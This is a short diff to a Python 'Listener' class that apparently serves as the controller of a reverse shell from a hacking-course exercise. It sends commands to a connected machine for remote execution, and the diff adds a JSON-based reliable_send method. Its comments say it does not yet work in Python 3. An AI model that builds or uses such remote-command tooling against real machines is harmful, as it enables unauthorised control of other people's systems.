@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 #needs debugging to work in python 3 - bytes-like object error issue
 
-import socket
+import json, socket
 
 class Listener:
     def __init__(self, listen_ip, listen_port): #constructor
@@ -16,6 +16,12 @@ class Listener:
     def execute_remotely(self, command, buffer_size):
         self.connection.send(command) #this will return TypeError in python3; requires bytes-like object, not string
         return self.connection.recv(buffer_size) #receive result in specified-byte chunks
+    
+    def reliable_send(self, data):
+        #seralise data being sent in order to make sure
+        #data arrives intact and pipe doesn't break
+        json_data = json.dumps(data) #dumps - method to convert to json object
+        self.connection.send(json_data)
     
     def run(self):
         while True:
